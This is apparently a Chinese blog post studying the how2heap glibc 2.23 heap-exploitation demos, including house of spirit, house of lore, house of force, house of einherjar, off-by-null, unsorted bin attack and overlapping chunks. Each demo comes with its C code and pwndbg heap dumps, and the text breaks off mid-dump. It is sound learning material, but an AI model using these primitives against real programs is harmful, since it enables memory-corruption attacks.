        <content type="html"><![CDATA[<p>[TOC]</p><p><code>how2heap</code>源码地址：<a href="https://github.com/shellphish/how2heap/tree/master">https://github.com/shellphish/how2heap/tree/master</a></p><p>本篇去除了所有注释（太占地方啦</p><h2 id="glibc-2-23"><a href="#glibc-2-23" class="headerlink" title="glibc_2.23"></a>glibc_2.23</h2><h3 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;assert.h&gt;void main() &#123;void* p1 &#x3D; calloc(1,0x40);free(p1);void* p3 &#x3D; malloc(0x400);        assert(p1 &#x3D;&#x3D; p3);free(p1);void *p4 &#x3D; malloc(0x400);assert(p4 &#x3D;&#x3D; p3);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>p1</code>被释放进入<code>fastbin</code>之后创建大小属于<code>large bin</code>的堆<code>p3</code>，判断完<code>p3</code>不属于<code>fastbin</code>和<code>small bin</code>之后进行<code>malloc consolidate</code>将<code>p1</code>整理到<code>unsorted bin</code>，又被合并到<code>top chunk</code>,在申请堆<code>p3</code>时就从<code>top chunk</code>取的堆，所以<code>p3</code>和<code>p1</code>地址相同，而此时<code>chunk1</code>地址成为了<code>chunk3</code>的地址，再次释放<code>chunk1</code>释放的就是<code>chunk3</code>，再申请与<code>chunk3</code>大小相同的堆时申请到的就是<code>chunk3</code>地址，因此<code>p4 = p3</code>且两个指针都未置零，因为释放的是<code>p1</code></p><h3 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123;        malloc(1);            unsigned long long *a;        unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));            fake_chunks[1] &#x3D; 0x40;         fake_chunks[9] &#x3D; 0x1234;             a &#x3D; &amp;fake_chunks[2];            free(a);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在栈中取了一个地址布置<code>fake_chunk</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x7fffffffe1b00x7fffffffe1b0: 0x0000000000000001      0x0000000000000040#size0x7fffffffe1c0: 0x00007ffff7ffe168      0x00000000000000f00x7fffffffe1d0: 0x00000000000000c2      0x000055555555542d0x7fffffffe1e0: 0x00007fffffffe20e      0x00000000000000000x7fffffffe1f0: 0x00005555555553e0      0x0000000000001234#next size<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>伪造成功即可释放<code>fake_chunk</code>到<code>bin</code>，其中<code>free</code>的地址是<code>user data</code>地址</p><h3 id="poison-null-byte-x2F-off-by-null"><a href="#poison-null-byte-x2F-off-by-null" class="headerlink" title="poison_null_byte&#x2F;off-by-null"></a>poison_null_byte&#x2F;off-by-null</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;malloc.h&gt;#include &lt;assert.h&gt;int main()&#123;        setbuf(stdin, NULL);        setbuf(stdout, NULL);        uint8_t* a;        uint8_t* b;        uint8_t* c;        uint8_t* b1;        uint8_t* b2;        uint8_t* d;        void *barrier;        a &#x3D; (uint8_t*) malloc(0x100);        int real_a_size &#x3D; malloc_usable_size(a);            b &#x3D; (uint8_t*) malloc(0x200);        c &#x3D; (uint8_t*) malloc(0x100);            barrier &#x3D;  malloc(0x100);            uint64_t* b_size_ptr &#x3D; (uint64_t*)(b - 8);        *(size_t*)(b+0x1f0) &#x3D; 0x200;        free(b);        a[real_a_size] &#x3D; 0;             uint64_t* c_prev_size_ptr &#x3D; ((uint64_t*)c)-2;            b1 &#x3D; malloc(0x100);        b2 &#x3D; malloc(0x80);        memset(b2,&#39;B&#39;,0x80);            free(b1);        free(c);            d &#x3D; malloc(0x300);            memset(d,&#39;D&#39;,0x300);            assert(strstr(b2, &quot;DDDDDDDDDDDD&quot;));&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>条件</strong>：没有<code>tcache</code>且有<code>off-by-one</code>漏洞</p><p>首先创建了四个堆，其中<code>barrier</code>是为了防止释放<code>c</code>时与<code>top chunk</code>合并</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x55555555c000#aSize: 0x111Allocated chunk | PREV_INUSEAddr: 0x55555555c110#bSize: 0x211Allocated chunk | PREV_INUSEAddr: 0x55555555c320#cSize: 0x111Allocated chunk | PREV_INUSEAddr: 0x55555555c430#barrierSize: 0x111Top chunk | PREV_INUSEAddr: 0x55555555c540Size: 0x20ac1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将堆<code>b</code>的末尾伪造成<code>next_chunk</code>的<code>prev_size</code>，使得通过<code>off-by-null</code>修改<code>b</code>的<code>size</code>的后两位为<code>0</code>之后依然能够绕过<code>size = prve_size(next_chunk)</code></p><pre class="line-numbers language-none"><code class="language-none">0x55555555c310: 0x0000000000000200      0x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>释放堆<code>b</code>并通过<code>off-by-null</code>将<code>b</code>的大小改成<code>0x200</code>，此时<code>c</code>被识别到伪造的<code>next_chunk</code>处，由于没有修改<code>size</code>位所以<code>size</code>为<code>0</code>，但已经绕过了检查</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x55555555c000Size: 0x111Free chunk (unsortedbin)Addr: 0x55555555c110Size: 0x200fd: 0x7ffff7dd1b78bk: 0x7ffff7dd1b78Allocated chunkAddr: 0x55555555c310Size: 0x00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建一个<code>0x100</code>的堆<code>b1</code>和一个<code>0x80</code>的堆<code>b2</code>,此时堆从<code>unsorted bin</code>中分割，地址在刚刚释放的<code>b</code>处</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x55555555c000Size: 0x111Allocated chunk | PREV_INUSEAddr: 0x55555555c110Size: 0x111Allocated chunk | PREV_INUSEAddr: 0x55555555c220Size: 0x91Free chunk (unsortedbin) | PREV_INUSEAddr: 0x55555555c2b0Size: 0x61fd: 0x7ffff7dd1b78bk: 0x7ffff7dd1b78Allocated chunkAddr: 0x55555555c310Size: 0x00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>且真实的<code>c</code>的<code>prve_size</code>没有更新，而是更新了伪造的<code>prve_size</code></p><pre class="line-numbers language-none"><code class="language-none">0x55555555c310: 0x0000000000000060      0x00000000000000000x55555555c320: 0x0000000000000210      0x0000000000000110<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>此时释放<code>b1</code>和<code>c</code>，会将<code>b1</code>和<code>c</code>合并成一个覆盖<code>b2</code>的堆</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x55555555c000Size: 0x111Free chunk (unsortedbin) | PREV_INUSEAddr: 0x55555555c110Size: 0x321fd: 0x55555555c2b0bk: 0x7ffff7dd1b78Allocated chunkAddr: 0x55555555c430Size: 0x110Top chunk | PREV_INUSEAddr: 0x55555555c540Size: 0x20ac1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时将合并的堆申请出来就能实现<code>overlap</code>，即申请的空间覆盖了<code>b2</code></p><h3 id="house-of-lore-x2F-small-bin"><a href="#house-of-lore-x2F-small-bin" class="headerlink" title="house_of_lore&#x2F;small bin"></a>house_of_lore&#x2F;small bin</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;assert.h&gt;void jackpot()&#123; fprintf(stderr, &quot;Nice jump d00d\n&quot;); exit(0); &#125;int main(int argc, char * argv[])&#123;  intptr_t* stack_buffer_1[4] &#x3D; &#123;0&#125;;  intptr_t* stack_buffer_2[3] &#x3D; &#123;0&#125;;  intptr_t *victim &#x3D; malloc(0x100);  intptr_t *victim_chunk &#x3D; victim-2;      stack_buffer_1[0] &#x3D; 0;  stack_buffer_1[1] &#x3D; 0;  stack_buffer_1[2] &#x3D; victim_chunk;  stack_buffer_1[3] &#x3D; (intptr_t*)stack_buffer_2;  stack_buffer_2[2] &#x3D; (intptr_t*)stack_buffer_1;  void *p5 &#x3D; malloc(1000);   free((void*)victim);  void *p2 &#x3D; malloc(1200);  victim[1] &#x3D; (intptr_t)stack_buffer_1;  void *p3 &#x3D; malloc(0x100);  char *p4 &#x3D; malloc(0x100);      intptr_t sc &#x3D; (intptr_t)jackpot;   memcpy((p4+40), &amp;sc, 8);  assert((long)__builtin_return_address(0) &#x3D;&#x3D; (long)jackpot);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建一个<code>small bin</code>之后在栈上伪造以该堆为起点的链，包含两个<code>fake chunk</code>,伪造过程即修改三个堆的<code>fd</code>和<code>bk</code>区域的位置，这样就可以绕过<code>small bin</code> 对<code>fd</code>以及需要申请的<code>fake chunk</code>不能在<code>small bin</code>链的尾部的检查，申请相同大小的堆即可将<code>fake chunk</code>申请出来。</p><p>相关<code>glibc</code>源码：</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if ((victim &#x3D; last (bin)) !&#x3D; bin)        &#123;          if (victim &#x3D;&#x3D; 0) &#x2F;* initialization check *&#x2F;            malloc_consolidate (av);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">else           &#123;             bck &#x3D; victim-&gt;bk;if (__glibc_unlikely (bck-&gt;fd !&#x3D; victim))               &#123;                 errstr &#x3D; &quot;malloc(): smallbin double linked list corrupted&quot;;                 goto errout;               &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从<code>small bin</code> 申请堆的时候会判断最后一个堆的<code>bk</code>指向的堆的<code>fd</code>是否是该堆，因此在需要申请的位置后面还要再伪造一个堆</p><p>创建两个堆（第二个防止合并），并且在栈上伪造一个链表</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x55555555b000Size: 0x111Allocated chunk | PREV_INUSEAddr: 0x55555555b110Size: 0x3f1Top chunk | PREV_INUSEAddr: 0x55555555b500Size: 0x20b01<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x7fffffffdd600x7fffffffdd60:0x00000000000000000x00000000000000000x7fffffffdd70:0x000055555555b0000x00007fffffffdd40<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x00007fffffffdd400x7fffffffdd40:0x00000000000000000x00000000000000000x7fffffffdd50:0x00007fffffffdd60<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>释放第一个堆并且再次创建一个堆使其进入<code>small bin</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapFree chunk (smallbins) | PREV_INUSEAddr: 0x55555555b000Size: 0x111fd: 0x7ffff7dd1c78bk: 0x7ffff7dd1c78Allocated chunkAddr: 0x55555555b110Size: 0x3f0Allocated chunk | PREV_INUSEAddr: 0x55555555b500Size: 0x4c1Top chunk | PREV_INUSEAddr: 0x55555555b9c0Size: 0x20641<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>改堆的<code>bk</code>为栈上伪造的堆的地址，第二次申请即可得到栈上的地址</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapFree chunk (smallbins) | PREV_INUSEAddr: 0x55555555b000Size: 0x111fd: 0x7ffff7dd1c78bk: 0x7fffffffdd60Allocated chunk | PREV_INUSEAddr: 0x55555555b110Size: 0x3f1Allocated chunk | PREV_INUSEAddr: 0x55555555b500Size: 0x4c1Top chunk | PREV_INUSEAddr: 0x55555555b9c0Size: 0x20641<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="overlapping-chunks"><a href="#overlapping-chunks" class="headerlink" title="overlapping_chunks"></a>overlapping_chunks</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;int main(int argc , char* argv[])&#123;intptr_t *p1,*p2,*p3,*p4;p1 &#x3D; malloc(0x100 - 8);p2 &#x3D; malloc(0x100 - 8);p3 &#x3D; malloc(0x80 - 8);memset(p1, &#39;1&#39;, 0x100 - 8);memset(p2, &#39;2&#39;, 0x100 - 8);memset(p3, &#39;3&#39;, 0x80 - 8);    free(p2);int evil_chunk_size &#x3D; 0x181;int evil_region_size &#x3D; 0x180 - 8;*(p2-1) &#x3D; evil_chunk_size;     p4 &#x3D; malloc(evil_region_size);    memset(p4, &#39;4&#39;, evil_region_size);memset(p3, &#39;3&#39;, 80);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建两个实际大小为<code>0x101</code>的堆和一个<code>0x81</code>的堆，释放第二个堆</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x55555555b000Size: 0x101Free chunk (unsortedbin) | PREV_INUSEAddr: 0x55555555b100Size: 0x101fd: 0x7ffff7dd1b78bk: 0x7ffff7dd1b78Allocated chunkAddr: 0x55555555b200Size: 0x80Top chunk | PREV_INUSEAddr: 0x55555555b280Size: 0x20d81<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将被释放的堆的大小改成第二、三个堆的大小之和， 此时第二个堆覆盖了第三个堆</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x55555555b000Size: 0x101Free chunk (unsortedbin) | PREV_INUSEAddr: 0x55555555b100Size: 0x181fd: 0x7ffff7dd1b78bk: 0x7ffff7dd1b78Top chunk | PREV_INUSEAddr: 0x55555555b280Size: 0x20d81<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再将该堆申请出来即可实现<code>overlap</code>,即申请的堆包含了初始的第三个堆且可向其写入数据</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x55555555b000Size: 0x101Allocated chunk | PREV_INUSEAddr: 0x55555555b100Size: 0x181Top chunk | PREV_INUSEAddr: 0x55555555b280Size: 0x20d81<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>实现效果：存在两个堆，使得上一个堆覆盖到下一个堆</p><h3 id="overlapping-chunks-2"><a href="#overlapping-chunks-2" class="headerlink" title="overlapping_chunks_2"></a>overlapping_chunks_2</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;malloc.h&gt;int main()&#123;    intptr_t *p1,*p2,*p3,*p4,*p5,*p6;  unsigned int real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;  int prev_in_use &#x3D; 0x1;  p1 &#x3D; malloc(1000);  p2 &#x3D; malloc(1000);  p3 &#x3D; malloc(1000);  p4 &#x3D; malloc(1000);  p5 &#x3D; malloc(1000);  real_size_p1 &#x3D; malloc_usable_size(p1);  real_size_p2 &#x3D; malloc_usable_size(p2);  real_size_p3 &#x3D; malloc_usable_size(p3);  real_size_p4 &#x3D; malloc_usable_size(p4);  real_size_p5 &#x3D; malloc_usable_size(p5);  memset(p1,&#39;A&#39;,real_size_p1);  memset(p2,&#39;B&#39;,real_size_p2);  memset(p3,&#39;C&#39;,real_size_p3);  memset(p4,&#39;D&#39;,real_size_p4);  memset(p5,&#39;E&#39;,real_size_p5);  free(p4);  *(unsigned int *)((unsigned char *)p1 + real_size_p1 ) &#x3D; real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2;  free(p2);  p6 &#x3D; malloc(2000);  real_size_p6 &#x3D; malloc_usable_size(p6);  memset(p6,&#39;F&#39;,1500);  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先创建5个堆，释放第四个堆，将第二个堆的大小改成二三两个堆大小之和，此时第二个堆覆盖了第三个堆</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x55555555b000Size: 0x3f1Allocated chunk | PREV_INUSEAddr: 0x55555555b3f0Size: 0x7e1Free chunk (unsortedbin) | PREV_INUSEAddr: 0x55555555bbd0Size: 0x3f1fd: 0x7ffff7dd1b78bk: 0x7ffff7dd1b78Allocated chunkAddr: 0x55555555bfc0Size: 0x3f0Top chunk | PREV_INUSEAddr: 0x55555555c3b0Size: 0x1fc51<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>释放被合并的堆并申请回来，此时第二、三、四个堆会被合并成一个堆</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x55555555b000Size: 0x3f1Allocated chunk | PREV_INUSEAddr: 0x55555555b3f0Size: 0x7e1Free chunk (unsortedbin) | PREV_INUSEAddr: 0x55555555bbd0Size: 0x3f1fd: 0x7ffff7dd1b78bk: 0x7ffff7dd1b78Allocated chunkAddr: 0x55555555bfc0Size: 0x3f0Top chunk | PREV_INUSEAddr: 0x55555555c3b0Size: 0x1fc51<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第三个堆始终没有被操作，而新创建的堆可以堆第三个堆进行读写，形成<code>overlap</code></p><p>相关<code>glibc</code>源码：</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;* consolidate forward *&#x2F;      if (!nextinuse) &#123;unlink(av, nextchunk, bck, fwd);size +&#x3D; nextsize;      &#125; elseclear_inuse_bit_at_offset(nextchunk, 0);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>释放被合并的堆的时候会判断下一个堆即第四个堆是被释放的，因此向下合并到第四个堆</p><p>实现效果：存在三个堆，将三个堆合并成一个堆，且可以覆写中间一个堆、中间一个堆始终未被操作</p><p>应用：2.31之前的<code>off-by-null</code>：创建三个堆<code>A、B、C</code>通过<code>off-by-bull</code>溢出<code>B</code>到<code>C</code>使得<code>C</code>的低字节被覆盖为<code>0</code>（注意：被覆盖的堆原始大小要在<code>fx</code>，这样创建的堆实际大小就是<code>10x</code>而不会因为修改了第二位导致错误，且<code>A</code>的大小属于<code>unsorted bin</code>）将<code>C</code>的<code>prve_size</code>改成<code>A</code>和<code>B</code>的大小之和，系统将判断<code>A</code>和<code>B</code>是一个堆并且已经被释放，此时释放<code>A</code>和<code>C</code>，从<code>A</code>到<code>C</code>的区域就会合并成一个堆并释放，而<code>B</code>仍然存在。</p><h3 id="house-of-force-x2F-top-chunk"><a href="#house-of-force-x2F-top-chunk" class="headerlink" title="house_of_force&#x2F;top chunk"></a>house_of_force&#x2F;top chunk</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;malloc.h&gt;#include &lt;assert.h&gt;char bss_var[] &#x3D; &quot;This is a string that we want to overwrite.&quot;;int main(int argc , char* argv[])&#123;    intptr_t *p1 &#x3D; malloc(256);int real_size &#x3D; malloc_usable_size(p1);    intptr_t *ptr_top &#x3D; (intptr_t *) ((char *)p1 + real_size - sizeof(long));*(intptr_t *)((char *)ptr_top + sizeof(long)) &#x3D; -1;unsigned long evil_size &#x3D; (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top;void *new_ptr &#x3D; malloc(evil_size);void* ctr_chunk &#x3D; malloc(100);strcpy(ctr_chunk, &quot;YEAH!!!&quot;);    assert(ctr_chunk &#x3D;&#x3D; bss_var);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>条件：可以溢出到top_chunk、可以申请任意大小的堆块</p><p>首先创建了一个堆，并溢出到<code>top chunk</code>将<code>size</code>改成<code>-1</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x55555555c000Size: 0x111Allocated chunk | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENAAddr: 0x55555555c110Size: 0xffffffffffffffff<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>计算要覆写的地址和<code>top chunk</code>的差并减去<code>chunk header</code>的大小，申请该大小的堆，即把所需地址之前的空间都申请完，因此下一个申请的堆<code>user data</code>处即为要覆写的区域</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk#申请完所求地址之前的所有空间Addr: 0x555555558000Size: 0x555555558008<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted_bin_attack"></a>unsorted_bin_attack</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123;    unsigned long stack_var&#x3D;0;    unsigned long *p&#x3D;malloc(400);malloc(500);free(p);    p[1]&#x3D;(unsigned long)(&amp;stack_var-2);    malloc(400);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>前提：控制unsorted bin的bk指针</p><p>目的：实现修改任意地址值为一个较大的数值，但是数值不受控制</p><ul><li>通过修改循环的次数来使得程序可以执行多次循环</li><li>修改global_max_fast 来使得更大的 chunk 可以被视为 fast bin，执行 fast bin attack</li></ul><p>原理：将一个 unsorted bin 取出的时候，会将 <code>bck-&gt;fd</code> 的位置写入本 Unsorted Bin 的位置</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;* remove from unsorted list *&#x2F;          unsorted_chunks (av)-&gt;bk &#x3D; bck;          bck-&gt;fd &#x3D; unsorted_chunks (av);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>控制 bk 的值就能将 <code>unsorted_chunks (av)</code> 写到任意地址（要减两个机器字长作为<code>prev_size</code>和<code>size</code>，此时<code>Target Value</code> 处于伪造 <code>chunk</code> 的<code>fd</code>处）</p><p><code>victim</code> 的<code>fd</code>在取<code>chunk</code>时并没有发挥作用，所以修改为不合法的值也没有关系，但是<code>unsorted bin </code>链表可能就此破坏，在插入 <code>chunk</code> 时，可能会出现问题</p><p>实现：将<code>unsorted bin</code>中的<code>chunk</code>通过溢出修改<code>bk</code>为要修的地址 - 两个机器字节，再分配掉即可将地址内容改成很大的数值</p><h3 id="house-of-einherjar-off-by-null"><a href="#house-of-einherjar-off-by-null" class="headerlink" title="house_of_einherjar(off-by-null)"></a>house_of_einherjar(off-by-null)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;malloc.h&gt;int main()&#123;setbuf(stdin, NULL);setbuf(stdout, NULL);uint8_t* a;uint8_t* b;uint8_t* d;a &#x3D; (uint8_t*) malloc(0x38);    int real_a_size &#x3D; malloc_usable_size(a);size_t fake_chunk[6];fake_chunk[0] &#x3D; 0x100; fake_chunk[1] &#x3D; 0x100; fake_chunk[2] &#x3D; (size_t) fake_chunk; fake_chunk[3] &#x3D; (size_t) fake_chunk; fake_chunk[4] &#x3D; (size_t) fake_chunk; fake_chunk[5] &#x3D; (size_t) fake_chunk; b &#x3D; (uint8_t*) malloc(0xf8);int real_b_size &#x3D; malloc_usable_size(b);uint64_t* b_size_ptr &#x3D; (uint64_t*)(b - 8);    a[real_a_size] &#x3D; 0;     size_t fake_size &#x3D; (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);  *(size_t*)&amp;a[real_a_size-sizeof(size_t)] &#x3D; fake_size;fake_chunk[1] &#x3D; fake_size;free(b);    d &#x3D; malloc(0x200);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先创建了一个<code>0x30</code>的堆</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x55555555b000Size: 0x41Top chunk | PREV_INUSEAddr: 0x55555555b040Size: 0x20fc1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在栈上伪造了一个<code>fake chunk</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x7fffffffe1c00x7fffffffe1c0: 0x0000000000000100      0x0000000000000100#prev_size, size0x7fffffffe1d0: 0x00007fffffffe1c0      0x00007fffffffe1c0  #fd, bk0x7fffffffe1e0: 0x00007fffffffe1c0      0x00007fffffffe1c0#fd_nextsize, bk_nextsize<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>创建一个<code>0xf8</code>大小的堆，并通过上一个堆的溢出来将这个堆<code>prve_inuse</code>位改成<code>0</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x55555555b000Size: 0x41Allocated chunkAddr: 0x55555555b040Size: 0x100Top chunk | PREV_INUSEAddr: 